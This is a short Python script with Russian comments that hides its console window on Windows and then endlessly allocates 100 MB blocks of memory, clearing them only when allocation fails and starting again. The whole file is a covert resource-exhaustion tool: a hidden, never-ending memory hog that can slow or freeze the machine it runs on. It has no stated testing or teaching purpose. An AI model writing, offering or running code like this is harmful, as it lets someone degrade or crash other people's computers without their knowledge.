#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys
import ctypes
import time

def hide_console():
    if sys.platform == 'win32':
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def create_ram_load():
    # Список для хранения данных
    data = []
    
    while True:
        try:
            # Выделяем 100MB памяти
            data.append(' ' * (100 * 1024 * 1024))
            time.sleep(0.1)
        except:
            # Если память закончилась, очищаем список
            data.clear()
            time.sleep(1)

if __name__ == "__main__":
    hide_console()
    create_ram_load() 